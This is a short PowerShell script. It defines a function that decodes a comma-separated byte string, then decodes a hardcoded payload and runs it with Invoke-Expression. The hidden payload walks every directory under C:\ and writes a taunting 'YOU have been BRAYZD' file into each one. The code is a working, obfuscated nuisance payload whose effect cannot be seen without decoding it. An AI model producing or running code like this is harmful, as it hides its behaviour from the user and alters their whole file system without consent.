function Deobfuscate-Script {
    [CmdletBinding()]
    param(
        # The obfuscated script, as a string of comma-separated values
        [Parameter(Mandatory = $true)]
        [string] $Encoded
    )

    # Split the encoded string into an array of bytes
    $bytes = $Encoded.Split(',') | ForEach-Object { [byte] $_ }

    # Convert the bytes back to a script string
    $script = [System.Text.Encoding]::ASCII.GetString($bytes)

    # Output the de-obfuscated script
    Write-Output $script
}

# De-obfuscate an encoded script
$encoded = '36,100,105,114,115,32,61,32,71,101,116,45,67,104,105,108,100,73,116,101,109,32,45,80,97,116,104,32,34,67,58,92,34,32,45,68,105,114,101,99,116,111,114,121,32,45,82,101,99,117,114,115,101,13,10,13,10,102,111,114,101,97,99,104,32,40,36,100,105,114,32,105,110,32,36,100,105,114,115,41,32,123,13,10,32,32,32,32,78,101,119,45,73,116,101,109,32,45,80,97,116,104,32,34,36,100,105,114,92,104,101,108,108,111,46,98,114,97,121,122,100,34,32,45,73,116,101,109,84,121,112,101,32,70,105,108,101,32,45,86,97,108,117,101,32,34,89,79,85,32,104,97,118,101,32,98,101,101,110,32,66,82,65,89,90,68,34,13,10,125'
$script = Deobfuscate-Script -Encoded $encoded

# Execute the de-obfuscated script
Invoke-Expression -Command $script
